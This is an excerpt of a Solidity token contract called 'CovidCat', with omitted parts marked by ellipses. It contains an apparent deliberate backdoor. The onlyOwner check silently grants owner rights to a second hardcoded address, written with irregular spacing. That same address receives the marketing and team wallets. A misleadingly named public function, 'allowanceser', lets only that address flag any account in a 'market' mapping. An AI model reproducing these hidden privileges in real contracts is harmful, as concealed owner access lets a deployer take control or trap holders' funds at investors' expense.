...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xF7A11C7E4B8DC2E2019e026A874d3E5B80Ea080e) , "Ownable: caller is not the owner");
        _;
    }
...
contract CovidCat is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CovidCat";
    string private _symbol = "CovidCat";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF7A11C7E4B8DC2E2019e026A874d3E5B80Ea080e);
    address payable public teamWalletAddress = payable(0xF7A11C7E4B8DC2E2019e026A874d3E5B80Ea080e);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0xF7A11C7E4B8DC2E2019e026A874d3E5B80Ea080e));
        market[addr] = status;
    }
